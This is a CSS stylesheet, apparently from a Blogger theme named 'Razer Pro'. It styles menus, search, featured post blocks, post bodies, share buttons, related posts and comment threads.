.mega-menu .mega-items.no-items{grid-template-columns:1fr}
.mega-items .mega-item{position:relative;width:100%;display:flex;flex-direction:column;padding:0}
.mega-item .entry-image-wrap{width:100%;height:124px;z-index:1;margin:0 0 8px}
.mega-item .entry-title{font-size:15px}
.mega-item .entry-title a{color:var(--megamenu-color)}
.mega-item .entry-title a:hover{color:var(--megamenu-hover-color)}
.mega-menu .error-msg{justify-content:center}
.mobile-menu-toggle{display:none;height:34px;font-size:18px;color:var(--header-color);align-items:center;padding:0 15px}
.mobile-menu-toggle:after{content:'\f0c9';font-family:'Font Awesome 5 Free';font-weight:900;margin:0}
.mobile-menu-toggle:hover{color:var(--header-hover-color)}
.main-toggle-wrap{height:52px;display:flex;z-index:20;margin:0}
.main-toggle-style{width:52px;height:100%;color:var(--header-color);font-size:15px;display:flex;align-items:center;justify-content:center;cursor:pointer;z-index:20;padding:0;margin:0}
.darkmode-toggle{width:auto;font-size:14px;padding:0 15px}
.darkmode-toggle:after{content:'\f186';font-family:'Font Awesome 5 Free';font-weight:400;margin:0}
.is-dark .darkmode-toggle:after{content:'\f185';font-weight:900}
.hide-search,.show-search{background-color:rgba(155,155,155,.1);transition:opacity .17s ease}
.is-dark .hide-search,.is-dark .show-search{background-color:rgba(255,255,255,.02)}
.show-search:after{content:'\f002';font-family:'Font Awesome 5 Free';font-weight:900;margin:0}
.main-toggle-style:hover{color:var(--header-hover-color)}
#main-search-wrap{display:none;position:absolute;top:0;left:0;width:100%;height:52px;background-color:var(--header-bg);z-index:25;margin:0}
.main-search{position:relative;float:right;width:100%;height:100%;background-color:rgba(0,0,0,0);overflow:hidden;display:flex;justify-content:space-between;align-items:center;margin:0;animation:showSearch .17s ease}
.rtl .main-search{float:left}
.main-search .search-form{position:relative;height:34px;background-color:rgba(0,0,0,0);flex:1;border:0}
.main-search .search-input{position:relative;width:100%;height:34px;background-color:rgba(0,0,0,0);font-family:inherit;font-size:14px;color:var(--header-color);font-weight:400;padding:0 15px 0 0;border:0}
.rtl .main-search .search-input{padding:0 0 0 15px}
.main-search .search-input::placeholder,.main-search .search-input:focus{color:var(--header-color);outline:0}
.main-search .search-input::placeholder{opacity:.65}
.hide-search:after{content:'\f00d';font-family:'Font Awesome 5 Free';font-weight:900;margin:0}
@-webkit-keyframes showSearch{0%{width:80%;opacity:0}100%{width:100%;opacity:1}}
.header-inner.is-fixed{position:fixed;top:-52px;left:0;width:100%;z-index:990;backface-visibility:hidden;visibility:hidden;opacity:0;transition:all .25s ease}
.header-inner.is-fixed.show{top:0;opacity:1;visibility:visible;margin:0}
.overlay{visibility:hidden;opacity:0;position:fixed;top:0;left:0;right:0;bottom:0;background-color:rgba(23,28,36,.6);z-index:1000;-webkit-backdrop-filter:saturate(100%) blur(3px);-ms-backdrop-filter:saturate(100%) blur(3px);-o-backdrop-filter:saturate(100%) blur(3px);backdrop-filter:saturate(100%) blur(3px);margin:0;transition:all .25s ease}
#slide-menu{display:none;position:fixed;width:300px;height:100%;top:0;left:0;bottom:0;background-color:var(--mobilemenu-bg);overflow:hidden;z-index:1010;left:0;-webkit-transform:translateX(-100%);transform:translateX(-100%);visibility:hidden;box-shadow:3px 0 7px rgba(0,0,0,.1);transition:all .25s ease}
.rtl #slide-menu{left:unset;right:0;-webkit-transform:translateX(100%);transform:translateX(100%)}
.nav-active #slide-menu,.rtl .nav-active #slide-menu{-webkit-transform:translateX(0);transform:translateX(0);visibility:visible}
.slide-menu-header{position:relative;float:left;width:100%;height:52px;background-color:var(--header-bg);overflow:hidden;display:flex;align-items:center;justify-content:space-between;box-shadow:0 2px 7px 0 rgba(0,0,0,.1)}
.mobile-search{flex:1;padding:0 0 0 15px}
.rtl .mobile-search{padding:0 15px 0 0}
.mobile-search .search-form{width:100%;height:34px;background-color:rgba(155,155,155,.1);overflow:hidden;display:flex;justify-content:space-between;border:1px solid var(--border-color);border-radius:var(--border-radius)}
.is-dark .mobile-search .search-form{background-color:rgba(255,255,255,.01)}
.mobile-search .search-input{flex:1;width:100%;height:32px;background-color:rgba(0,0,0,0);font-family:inherit;font-size:14px;color:var(--header-color);font-weight:400;padding:0 10px;border:0}
.mobile-search .search-input::placeholder,.mobile-search .search-input:focus{color:var(--header-color)}
.mobile-search .search-input::placeholder{opacity:.65}
.mobile-search .search-action{height:32px;background-color:rgba(0,0,0,0);font-family:inherit;font-size:12px;color:var(--header-color);font-weight:400;line-height:32px;text-align:center;cursor:pointer;padding:0 10px;border:0;opacity:.65}
.mobile-search .search-action:before{display:block;content:'\f002';font-family:'Font Awesome 5 Free';font-weight:900}
.mobile-search .search-action:hover{opacity:1}
.hide-razer-pro-mobile-menu{display:flex;height:100%;color:var(--header-color);font-size:16px;align-items:center;cursor:pointer;z-index:20;padding:0 15px}
.hide-razer-pro-mobile-menu:before{content:'\f00d';font-family:'Font Awesome 5 Free';font-weight:900}
.hide-razer-pro-mobile-menu:hover{color:var(--header-hover-color)}
.slide-menu-flex{position:relative;float:left;width:100%;height:calc(100% - 52px);display:flex;flex-direction:column;justify-content:space-between;overflow:hidden;overflow-y:auto;-webkit-overflow-scrolling:touch;margin:0}
.razer-pro-mobile-menu{position:relative;float:left;width:100%;padding:15px}
.razer-pro-mobile-menu .m-sub{display:none}
.razer-pro-mobile-menu ul li{position:relative;display:block;overflow:hidden;float:left;width:100%;margin:0}
.razer-pro-mobile-menu>ul li ul{overflow:hidden}
.razer-pro-mobile-menu ul li a{font-size:14px;color:var(--mobilemenu-color);font-weight:400;padding:8px 0;display:block}
.razer-pro-mobile-menu>ul>li>a{font-family:var(--menu-font);font-weight:700;text-transform:uppercase}
.razer-pro-mobile-menu ul li.has-sub .submenu-toggle{position:absolute;top:0;right:0;width:30px;color:var(--mobilemenu-color);text-align:right;cursor:pointer;padding:8px 0}
.rtl .razer-pro-mobile-menu ul li.has-sub .submenu-toggle{text-align:left;right:auto;left:0}
.razer-pro-mobile-menu ul li.has-sub .submenu-toggle:after{content:'\f078';font-family:'Font Awesome 5 Free';font-weight:900;float:right;font-size:12px;text-align:right;transition:all 0 ease}
.rtl .razer-pro-mobile-menu ul li.has-sub .submenu-toggle:after{float:left}
.razer-pro-mobile-menu ul li.has-sub.show>.submenu-toggle:after{content:'\f077'}
.razer-pro-mobile-menu ul li a:hover,.razer-pro-mobile-menu ul li.has-sub.show>.submenu-toggle,.razer-pro-mobile-menu ul li.has-sub.show>a{color:var(--mobilemenu-hover-color)}
.razer-pro-mobile-menu>ul>li>ul>li a{opacity:.75;padding:8px 0 8px 10px}
.rtl .razer-pro-mobile-menu>ul>li>ul>li a{padding:8px 10px 8px 0}
.razer-pro-mobile-menu>ul>li>ul>li>ul>li>a{padding:8px 0 8px 20px}
.rtl .razer-pro-mobile-menu>ul>li>ul>li>ul>li>a{padding:8px 20px 8px 0}
.razer-pro-mobile-menu ul>li>.submenu-toggle:hover{color:var(--mobilemenu-hover-color)}
.mm-footer{position:relative;float:left;width:100%;padding:20px 15px;margin:0}
.mm-footer .mm-menu,.mm-footer .mm-social{position:relative;float:left;width:100%;margin:8px 0 0}
.mm-footer .mm-social{margin:0}
.mm-footer ul{display:flex;flex-wrap:wrap}
.mm-footer .mm-social ul li{margin:0 16px 0 0}
.rtl .mm-footer .mm-social ul li{margin:0 0 0 16px}
.mm-footer .mm-social ul li:last-child{margin:0}
.mm-footer .mm-social ul li a{display:block;font-size:14px;color:var(--mobilemenu-color);padding:0}
.mm-footer .mm-social ul li a:hover{color:var(--mobilemenu-hover-color)}
.mm-footer .mm-menu ul li{margin:5px 18px 0 0}
.rtl .mm-footer .mm-menu ul li{margin:5px 0 0 18px}
.mm-footer .mm-menu ul li:last-child{margin:5px 0 0}
.mm-footer .mm-menu ul li a{display:block;font-size:14px;color:var(--mobilemenu-color);font-weight:400;padding:0}
.mm-footer .mm-menu ul li a:hover{color:var(--mobilemenu-hover-color)}
#header-ads-wrap{position:relative;float:left;width:100%;margin:0}
.header-ads .widget,.header-ads .widget-content{position:relative;float:left;width:100%;margin:0}
.header-ads .widget{margin:25px 0 0}
#featured .widget,#featured .widget-content,#featured-wrap{position:relative;float:left;width:100%;margin:0}
#featured .widget{display:none;background-color:var(--widget-bg);padding:20px;margin:25px 0 0;box-shadow:var(--widget-shadow)}
#featured .widget.PopularPosts,#featured .widget.is-visible{display:block}
#featured .widget-content{min-height:320px;display:flex;align-items:center;justify-content:center;margin:0}
#featured .widget-content .error-msg{padding:0}
.featured-items{position:relative;float:left;width:100%;height:100%}
.featured-cards{display:grid;grid-template-columns:1.5fr 1fr;grid-gap:10px}
.featured-item{position:relative;width:100%;height:240px;display:flex;flex-direction:column;margin:0}
.PopularPosts .featured-item:not(.card-style){display:none}
.featured-cards .featured-item.card-style.item-0{height:100%;grid-row:1/3}
.featured-item .entry-image-wrap{width:100%;height:154px;z-index:5;margin:0 0 8px}
.featured-cards .featured-item .entry-image-wrap{height:100%;margin:0}
.featured-item .entry-title{font-size:25px}
.featured-cards .featured-item.card-style.item-0 .entry-title{font-size:32px}
.featured-cards .entry-meta{flex-wrap:wrap}
#home-ads-wrap{position:relative;float:left;width:100%;margin:0}
.home-ads .widget,.home-ads .widget-content{position:relative;float:left;width:100%;margin:0}
.home-ads .widget{margin:25px 0 0}
.title-wrap{background-color:var(--feat-title-bg);position:relative;float:left;width:100%;display:flex;align-items:center;justify-content:space-between;padding:8px 20px;border-bottom:1px solid var(--border-color)}
.title-wrap>.title{display:flex;font-family:var(--title-font);font-size:16px;color:var(--feat-title-color);font-weight:700;margin:0}
.title-wrap>a.wt-l{font-size:12px;background-color:var(--feat-more-bg);color:var(--feat-more-color);font-weight:400;line-height:1;padding:4px 6px;transition:opacity .17s ease}
.title-wrap>a.wt-l:hover{opacity:.9}
.content-section,.content-section .content-block,.content-section .widget,.content-section .widget-content{position:relative;float:left;width:100%;margin:0}
.content-section .widget{display:none;background-color:var(--widget-bg);margin:0 0 25px;box-shadow:var(--widget-shadow)}
.content-section .widget.is-visible{display:block}
.content-section .widget.column-style{width:calc(50% - 12.5px)}
.content-section .widget.type-colRight{float:right}
#content-section-2 .widget:last-child{margin:0}
.content-section .widget-content{padding:20px}
.content-section .loader{height:180px}
.block1-items{display:grid;grid-template-columns:1fr;grid-gap:25px}
.block1-left,.block1-right{position:relative;width:100%;display:flex;flex-direction:column;margin:0}
.block1-right{display:grid;grid-template-columns:repeat(2,1fr);grid-gap:20px}
.block1-item{position:relative;display:flex;flex-direction:column}
.block1-left .block1-item{height:335px}
.block1-left .entry-image-wrap{width:100%;height:100%}
.block1-left .entry-title{font-size:22px}
.block1-left .entry-meta{flex-wrap:wrap}
.block1-right .block1-item{flex-direction:row;margin:0}
.block1-right .block1-item.item-1{margin:0}
.block1-right .entry-header{display:flex;flex-direction:column;flex:1}
.block1-right .entry-image-wrap{width:100px;height:65px;margin:0 13px 0 0}
.rtl .block1-right .entry-image-wrap{margin:0 0 0 13px}
.block1-right .entry-image-wrap.is-video:after{transform:translate(50%,-50%) scale(.75)}
.block1-right .entry-title{font-size:15px}
.block2-items{display:grid;grid-template-columns:1fr;grid-gap:20px}
.block2-item{position:relative;display:flex}
.block2-item.item-0{height:350px;flex-direction:column}
.block2-item .entry-image-wrap{width:200px;margin:0 16px 0 0;height:140px}
.rtl .block2-item .entry-image-wrap{margin:0 0 0 16px}
.block2-item.item-0 .entry-image-wrap{width:100%;height:100%;margin:0}
.block2-item .entry-header{display:flex;flex-direction:column;flex:1;margin:0}
.block2-item .entry-title{font-size:20px}
.block2-item.item-0 .entry-title{font-size:27px}
.block2-item .entry-meta{flex-wrap:wrap}
.block2-item .entry-excerpt{font-size:13px;color:var(--text-color)}
.grid1-items{display:grid;grid-template-columns:repeat(3,1fr);grid-gap:20px}
.grid1-item{position:relative;display:flex;flex-direction:column}
.grid1-item .entry-image-wrap{width:100%;height:140px;margin:0 0 8px}
.grid1-item .entry-title{font-size:16px}
.grid2-items{display:grid;grid-template-columns:repeat(2,1fr);grid-gap:25px}
.grid2-item{position:relative;display:flex;height:200px;flex-direction:column}
.grid2-item .entry-image-wrap{width:100%;height:100%;margin:0}
.grid2-item .entry-title{font-size:19px}
.grid2-item .entry-meta{flex-wrap:wrap}
.col-items{display:flex;flex-direction:column}
.col-items .col-item{position:relative;display:flex;margin:20px 0 0}
.col-items .col-item.item-0{height:190px;flex-direction:column;margin:0}
.col-items .entry-image-wrap{width:100px;height:65px;z-index:1;margin:0 13px 0 0}
.rtl .col-items .col-item:not(.item-0) .entry-image-wrap{margin:0 0 0 13px}
.col-items .col-item.item-0 .entry-image-wrap{width:100%;height:100%;margin:0}
.col-items .col-item:not(.item-0) .entry-image-wrap.is-video:after{transform:translate(50%,-50%) scale(.75)}
.col-items .entry-header{display:flex;flex-direction:column}
.col-items .col-item:not(.item-0) .entry-header{flex:1}
.col-items .entry-title{font-size:15px}
.col-items .item-0 .entry-title{font-size:22px}
.col-items .item-0 .entry-meta{flex-wrap:wrap}
.video-items{display:grid;grid-template-columns:repeat(3,1fr);grid-gap:2px}
.video-item{position:relative;height:180px;display:flex;flex-direction:column}
.video-item .entry-image-wrap{width:100%;height:100%;margin:0}
.video-item .entry-title{font-size:18px}
.video-item .entry-meta{flex-wrap:wrap}
.main-ads,.main-ads .widget,.main-ads .widget-content{position:relative;float:left;width:100%;margin:0}
#main-ads .widget{margin:0 0 25px}
.has-ad-m #main-ads-2 .widget{margin:0 0 25px}
#main .Blog,#main-wrapper #main{position:relative;float:left;width:100%;margin:0}
.is-home #main-wrapper.has-m #main{margin:0 0 25px}
.queryMessage{float:left;width:100%;margin:0}
.Blog.no-posts .queryMessage,.queryMessage .query-info{margin:0}
.queryMessage .query-info{position:relative;float:left;width:100%;font-family:var(--title-font);font-size:16px;color:var(--widget-title-color);font-weight:700;padding:8px 20px;border-bottom:1px solid var(--border-color)}
.queryEmpty{float:left;width:100%;font-size:14px;color:var(--text-color);font-weight:400;text-align:center;margin:50px 0}
.blog-posts-wrap{position:relative;float:left;width:100%;background-color:var(--widget-bg);box-shadow:var(--widget-shadow)}
.index-post-wrap{position:relative;float:left;width:100%;display:flex;flex-direction:column;padding:20px}
.blog-posts-wrap.no-posts .index-post-wrap{display:none}
.blog-post{display:block;word-wrap:break-word}
.index-post{position:relative;width:100%;display:flex;padding:0 0 20px;margin:0 0 20px;border-bottom:1px solid var(--border-color)}
.blog-posts-wrap .index-post:last-child{padding:0;margin:0;border:0}
.index-post .entry-image-wrap{width:235px;height:152px;margin:0 18px 0 0}
.rtl .index-post .entry-image-wrap{margin:0 0 0 18px}
.index-post .entry-header{display:flex;flex-direction:column;flex:1;margin:0}
.index-post .entry-title{font-size:22px;margin:0}
.index-post .entry-excerpt{font-size:13px;color:var(--text-color);margin:8px 0 0}
.index-post .entry-meta{flex-wrap:wrap;font-size:12px;margin:8px 0 0}
.inline-ad-wrap{position:relative;float:left;width:100%;margin:0}
.inline-ad{position:relative;float:left;width:100%;text-align:center;line-height:1;margin:0}
.post-animated{-webkit-animation-duration:.5s;animation-duration:.5s;-webkit-animation-fill-mode:both;animation-fill-mode:both}
@keyframes fadeInUp{from{opacity:0;transform:translate3d(0,10px,0)}to{opacity:1;transform:translate3d(0,0,0)}}
.post-fadeInUp{animation-name:fadeInUp}
.is-single .item-post,.item-post-inner,.item-post-wrap{position:relative;float:left;width:100%;margin:0}
.item-post-inner{background-color:var(--widget-bg);box-shadow:var(--widget-shadow)}
.item-post .blog-entry-header{position:relative;float:left;width:100%;display:flex;flex-direction:column;padding:20px;margin:0;border-bottom:1px solid var(--border-color)}
#breadcrumb{float:left;display:flex;width:100%;font-family:var(--meta-font);font-size:14px;color:var(--meta-color);font-weight:400;line-height:1;margin:0 0 13px}
#breadcrumb a{color:var(--meta-color)}
#breadcrumb a.home,#breadcrumb a:hover{color:var(--main-color)}
#breadcrumb em:after{content:'\f054';font-family:'Font Awesome 5 Free';font-size:9px;font-weight:900;font-style:normal;vertical-align:middle;margin:0 4px}
.rtl #breadcrumb em:after{content:'\f053'}
.item-post h1.entry-title{position:relative;float:left;width:100%;font-size:$(itempost.title.size);font-weight:700;margin:0}
.item-post .has-meta h1.entry-title{margin-bottom:13px}
.item-post .blog-entry-header .entry-meta{flex-wrap:wrap;justify-content:space-between;font-size:14px;margin:0}
.item-post .entry-meta .align-left,.item-post .entry-meta .align-right{display:flex;flex-wrap:wrap;align-items:center}
.item-post .entry-meta .entry-author{align-items:center}
.item-post .entry-meta .entry-author:before{display:none}
.item-post .entry-meta .author-avatar-wrap{overflow:visible;width:30px;height:30px;background-color:var(--widget-bg);padding:1px;margin:0 5px 0 0;border:1px solid var(--main-color);border-radius:100%}
.rtl .item-post .entry-meta .author-avatar-wrap{margin:0 0 0 5px}
.item-post .entry-meta .author-avatar-wrap:before{content:'';position:absolute;display:block;top:calc(50% - 6px);left:-1px;width:calc(100% + 2px);height:12px;background-color:var(--widget-bg);z-index:1;margin:0}
.item-post .entry-meta .author-avatar{z-index:2;border-radius:50%}
.entry-meta .entry-comments-link{display:none;margin:0 0 0 10px}
.rlt .entry-meta .entry-comments-link{margin:0 10px 0 0}
.entry-meta .entry-comments-link:before{display:inline-block;content:'\f086';font-family:'Font Awesome 5 Free';font-size:14px;color:var(--main-color);font-weight:400;margin:0 4px 0 0}
.rtl .entry-meta .entry-comments-link:before{margin:0 0 0 4px}
.entry-meta .entry-comments-link.show{display:block}
.entry-share-links{display:flex}
.entry-share-links li{margin:0 0 0 8px}
.rtl .entry-share-links li{margin:0 8px 0 0}
.entry-share-links a{display:flex;width:24px;height:24px;font-size:12px;color:#fff;font-weight:400;cursor:pointer;align-items:center;justify-content:center;overflow:hidden;border-radius:50%}
.entry-content-wrap{position:relative;float:left;width:100%;padding:20px;margin:0}
#post-body{position:relative;float:left;width:100%;font-family:var(--text-font);font-size:$(itempost.content.size);color:var(--post-text-color);line-height:1.6em;padding:0;margin:0}
.post-body p{margin-bottom:25px}
.post-body h1,.post-body h2,.post-body h3,.post-body h4,.post-body h5,.post-body h6{font-size:17px;color:var(--title-color);line-height:1.3em;margin:0 0 20px}
.post-body h1{font-size:26px}
.post-body h2{font-size:23px}
.post-body h3{font-size:20px}
.post-body img{height:auto!important}
blockquote{position:relative;background-color:rgba(155,155,155,.05);color:var(--title-color);font-style:normal;padding:20px 25px;margin:0;border-radius:var(--border-radius)}
blockquote:before{position:absolute;left:10px;top:10px;content:'\f10e';font-family:'Font Awesome 5 Free';font-size:33px;font-style:normal;font-weight:900;color:var(--title-color);line-height:1;opacity:.05;margin:0}
.rtl blockquote:before{left:unset;right:10px}
.post-body .responsive-video-wrap{position:relative;width:100%;padding:0;padding-top:56%}
.post-body .responsive-video-wrap iframe{position:absolute;top:0;left:0;width:100%;height:100%}
.post-body ul{padding:0 0 0 15px;margin:10px 0}
.rtl .post-body ul{padding:0 15px 0 0}
.post-body li{margin:5px 0;padding:0}
.post-body ol ul li,.post-body ul li{list-style:none}
.post-body ul li:before{display:inline-block;content:'\2022';margin:0 5px 0 0}
.rtl .post-body ul li:before{margin:0 0 0 5px}
.post-body ol{counter-reset:ify;padding:0 0 0 15px;margin:10px 0}
.rtl .post-body ol{padding:0 15px 0 0}
.post-body ol>li{counter-increment:ify;list-style:none}
.post-body ol>li:before{display:inline-block;content:counters(ify,'.') '.';margin:0 5px 0 0}
.rtl .post-body ol>li:before{margin:0 0 0 5px}
.post-body u{text-decoration:underline}
.post-body strike{text-decoration:line-through}
.post-body sup{vertical-align:super}
.post-body a{color:var(--main-color)}
.post-body a:hover{text-decoration:underline}
.post-body a.button{display:inline-block;height:34px;background-color:var(--button-bg);font-family:var(--body-font);font-size:14px;color:var(--button-color);font-weight:400;line-height:34px;text-align:center;text-decoration:none;cursor:pointer;padding:0 20px;margin:0 6px 8px 0}
.rtl .post-body a.button{margin:0 0 8px 6px}
.post-body a.colored-button{color:#fff}
.post-body a.button:hover{background-color:var(--button-hover-bg);color:var(--button-hover-color)}
.post-body a.colored-button:hover{background-color:var(--button-hover-bg)!important;color:var(--button-hover-color)!important}
.button:before{float:left;font-family:'Font Awesome 5 Free';font-weight:900;display:inline-block;margin:0 8px 0 0}
.rtl .button:before{float:right;margin:0 0 0 8px}
.button.preview:before{content:'\f06e'}
.button.download:before{content:'\f019'}
.button.link:before{content:'\f0c1'}
.button.cart:before{content:'\f07a'}
.button.info:before{content:'\f06a'}
.button.share:before{content:'\f1e0'}
.button.contact:before{content:'\f0e0';font-weight:400}
.alert-message{position:relative;display:block;padding:15px;border:1px solid var(--border-color);border-radius:var(--border-radius)}
.alert-message.alert-success{background-color:rgba(34,245,121,.03);border:1px solid rgba(34,245,121,.5)}
.alert-message.alert-info{background-color:rgba(55,153,220,.03);border:1px solid rgba(55,153,220,.5)}
.alert-message.alert-warning{background-color:rgba(185,139,61,.03);border:1px solid rgba(185,139,61,.5)}
.alert-message.alert-error{background-color:rgba(231,76,60,.03);border:1px solid rgba(231,76,60,.5)}
.alert-message:before{font-family:'Font Awesome 5 Free';font-size:16px;font-weight:900;display:inline-block;margin:0 5px 0 0}
.rtl .alert-message:before{margin:0 0 0 5px}
.alert-message.alert-success:before{content:'\f058';color:#22f579}
.alert-message.alert-info:before{content:'\f05a';color:#3799dc}
.alert-message.alert-warning:before{content:'\f06a';color:#b98b3d}
.alert-message.alert-error:before{content:'\f057';color:#e74c3c}
.post-body table{width:100%;overflow-x:auto;text-align:left;margin:0;border-collapse:collapse;border:1px solid var(--border-color)}
.rtl .post-body table{text-align:right}
.post-body table td,.post-body table th{padding:7px 15px;border:1px solid var(--border-color)}
.post-body table thead th{color:var(--post-title-color);font-weight:700;vertical-align:bottom}
table.tr-caption-container,table.tr-caption-container td,table.tr-caption-container th{line-height:1;padding:0;border:0}
table.tr-caption-container td.tr-caption{font-size:13px;color:var(--meta-color);padding:6px 0 0}
.tocify-wrap{display:flex;width:100%;clear:both;margin:0}
.tocify-inner{position:relative;max-width:100%;background-color:rgba(155,155,155,.05);display:flex;flex-direction:column;overflow:hidden;font-size:14px;color:var(--title-color);line-height:1.6em;border:1px solid var(--border-color);border-radius:var(--border-radius)}
a.tocify-title{position:relative;height:38px;font-size:16px;color:var(--title-color);font-weight:700;display:flex;align-items:center;justify-content:space-between;padding:0 15px;margin:0}
.tocify-title-text{display:flex}
.tocify-title-text:before{content:'\f0cb';font-family:'Font Awesome 5 Free';font-size:14px;font-weight:900;margin:0 6px 0 0}
.rtl .tocify-title-text:after{margin:0 0 0 6px}
.tocify-title:after{content:'\f078';font-family:'Font Awesome 5 Free';font-size:12px;font-weight:900;margin:0 0 0 25px}
.rtl .tocify-title:after{margin:0 25px 0 0}
.tocify-title.is-expanded:after{content:'\f077'}
a.tocify-title:hover{text-decoration:none}
#tocify{display:none;padding:0 15px 10px;margin:0}
#tocify ol{padding:0 0 0 15px}
.rtl #tocify ol{padding:0 15px 0 0}
#tocify li{font-size:14px;margin:8px 0}
#tocify li a{color:var(--main-color)}
#tocify li a:hover{color:var(--main-color);text-decoration:underline}
.post-body .contact-form{display:table;font-family:var(--body-font)}
.contact-form .widget-title{display:none}
.contact-form .contact-form-name{width:calc(50% - 5px)}
.rtl .contact-form .contact-form-name{float:right}
.contact-form .contact-form-email{float:right;width:calc(50% - 5px)}
.rtl .contact-form .contact-form-email{float:left}
.post-body pre,pre.code-box{position:relative;display:block;background-color:rgba(155,155,155,.05);font-family:Monospace;font-size:13px;color:var(--post-text-color);white-space:pre-wrap;line-height:1.4em;padding:15px;margin:0;border:1px solid var(--border-color);border-radius:var(--border-radius)}
.post-body .google-auto-placed{margin:25px 0}
.post-footer{position:relative;float:left;width:100%;margin:0}
.entry-labels{position:relative;float:left;width:100%;display:flex;flex-wrap:wrap;margin:20px 0 0}
.entry-labels a,.entry-labels span{font-size:14px;color:var(--main-color);font-weight:400;line-height:1;margin:5px 6px 0 0}
.rtl .entry-labels a,.rtl .entry-labels span{margin:5px 0 0 6px}
.entry-labels span{color:var(--title-color);font-weight:700}
.entry-labels a:hover{color:var(--title-color)}
.entry-labels a:after{content:',';color:var(--meta-color)}
.entry-labels a:last-child:after{display:none}
.post-share{position:relative;float:left;width:100%;padding:14px 20px 20px;border-top:1px solid var(--border-color)}
ul.razer-pro-share-links{display:flex;flex-wrap:wrap;align-items:flex-start}
.razer-pro-share-links li{padding:0 6px 0 0}
.rtl .razer-pro-share-links li{padding:0 0 0 6px}
.razer-pro-share-links li a{display:flex;width:34px;height:34px;font-size:16px;color:#fff;font-weight:400;cursor:pointer;align-items:center;justify-content:center;margin:6px 0 0}
.razer-pro-share-links li.has-span a{width:auto;justify-content:flex-start}
.razer-pro-share-links li.has-span a:before{padding:0 10px}
.razer-pro-share-links span{font-size:14px;line-height:1;padding:0 20px 0 10px;border-left:1px solid rgba(255,255,255,.2)}
.rtl .razer-pro-share-links span{padding:0 10px 0 20px;border-left:0;border-right:1px solid rgba(255,255,255,.2)}
.razer-pro-share-links li a:hover{opacity:.9}
.razer-pro-share-links .show-hid a{background-color:rgba(155,155,155,.1);font-size:14px;color:rgba(155,155,155,.8)}
.razer-pro-share-links .show-hid a:before{content:'\f067';font-family:'Font Awesome 5 Free';font-weight:900}
.show-hidden .show-hid a:before{content:'\f068'}
.razer-pro-share-links li.linkedin,.razer-pro-share-links li.reddit,.razer-pro-share-links li.telegram,.razer-pro-share-links li.tumblr{display:none}
.show-hidden li.linkedin,.show-hidden li.reddit,.show-hidden li.telegram,.show-hidden li.tumblr{display:inline-block}
.about-author{position:relative;float:left;width:100%;background-color:var(--widget-bg);display:flex;padding:20px;margin:25px 0 0;box-shadow:var(--widget-shadow)}
.about-author .author-avatar-wrap{width:60px;height:60px;margin:0 15px 0 0;border-radius:50%;box-shadow:var(--avatar-shadow)}
.rtl .about-author .author-avatar-wrap{margin:0 0 0 15px}
.about-author .author-title{display:block;font-family:var(--title-font);font-size:18px;color:var(--title-color);font-weight:700;margin:0 0 10px}
.about-author .author-title a{color:var(--title-color)}
.about-author .author-title a:hover{color:var(--title-hover-color)}
.author-description{display:flex;flex-direction:column;flex:1}
.author-description .author-text{display:block;font-size:$(itempost.content.size);color:var(--text-color);font-weight:400}
.author-description .author-text a,.author-description .author-text br{display:none}
ul.author-links{display:flex;flex-wrap:wrap;padding:0}
.author-links li{margin:10px 12px 0 0}
.rtl .author-links li{margin:10px 0 0 12px}
.author-links li a{display:block;font-size:14px;color:var(--text-color);padding:0}
.author-links li a:hover{opacity:.9}
#razer-pro-related-posts{display:none}
#related-wrap{position:relative;float:left;width:100%;background-color:var(--widget-bg);margin:25px 0 0;box-shadow:var(--widget-shadow)}
#related-wrap .related-tag{display:none}
.razer-pro-related-content{position:relative;float:left;width:100%;padding:20px;margin:0}
.razer-pro-related-content .loader{height:200px}
.related-posts{position:relative;display:grid;grid-template-columns:repeat(3,1fr);grid-gap:20px;margin:0}
.related-posts .related-item{position:relative;width:100%;display:flex;flex-direction:column;margin:0}
.related-posts .entry-image-wrap{width:100%;height:140px;margin:0 0 8px}
.related-posts .entry-title{font-size:16px}
.razer-pro-blog-post-comments{display:none;float:left;width:100%;background-color:var(--widget-bg);margin:25px 0 0;box-shadow:var(--widget-shadow)}
.razer-pro-blog-post-comments .fb_iframe_widget_fluid_desktop{float:left;display:block!important;width:calc(100% + 16px)!important;max-width:calc(100% + 16px)!important;margin:0 -8px}
.razer-pro-blog-post-comments .fb_iframe_widget_fluid_desktop iframe,.razer-pro-blog-post-comments .fb_iframe_widget_fluid_desktop span{float:left;display:block!important;width:100%!important}
#comments,#disqus_thread{position:relative;float:left;width:100%;display:block;clear:both;padding:20px;margin:0}
#disqus_thread,.fb-comments{padding:0}
.comments-system-disqus #comments,.comments-system-facebook #comments{padding:10px 20px}
#comments h4#comment-post-message,.comments-title{display:none}
.comments-system-blogger .comments-title{display:block}
.comments .comments-content{float:left;width:100%;margin:0}
.comments .comment-content{display:block;font-family:var(--text-font);font-size:$(itempost.content.size);color:var(--text-color);line-height:1.6em;margin:10px 0 0}
.comments .comment-content>a:hover{text-decoration:underline}
.comment-thread .comment{position:relative;list-style:none;padding:20px 0 0;margin:20px 0 0;border-top:1px solid var(--border-color)}
.comment-thread .comment .comment{border-top:1px solid var(--border-color)}
.comment-thread ol{padding:0;margin:0}
.toplevel-thread ol>li:first-child{padding:0;margin:0;border:0}
.toplevel-thread ol>li:first-child>.comment-block{padding-top:0;margin:0;border:0}
.comment-thread ol ol .comment:before{content:'\f3bf';position:absolute;left:-25px;top:-11px;font-family:'Font Awesome 5 Free';font-size:16px;color:var(--border-color);font-weight:700;transform:rotate(90deg);margin:0}
.rtl .comment-thread ol ol .comment:before{content:'\f3be';left:unset;right:-25px}
.comments .comment-replybox-single iframe{padding:0 0 0 48px;margin:10px 0 0}
.rtl .comments .comment-replybox-single iframe{padding:0 48px 0 0}
.comment-thread .avatar-image-container{position:absolute;top:20px;left:0;width:35px;height:35px;overflow:hidden;border-radius:50%;box-shadow:var(--avatar-shadow)}
.toplevel-thread ol>li:first-child>.avatar-image-container{top:0}
.rtl .comment-thread .avatar-image-container{left:auto;right:0}
.avatar-image-container img{width:100%;height:100%}
.comments .comment-header{padding:0 0 0 48px}
.rtl .comments .comment-header{padding:0 48px 0 0}
.comments .comment-header .user{display:inline-block;font-family:var(--title-font);font-size:16px;color:var(--title-color);font-style:normal;font-weight:700;margin:0}
.comments .comment-header .user a{color:var(--title-color)}
.comments .comment-header .user a:hover{color:var(--title-hover-color)}
.comments .comment-header .icon.user{display:none}
.comments .comment-header .icon.blog-author{display:inline-block;font-size:13px;color:var(--main-color);font-weight:400;vertical-align:top;margin:-5px 0 0 5px}
.rtl .comments .comment-header .icon.blog-author{margin:-5px 5px 0 0}
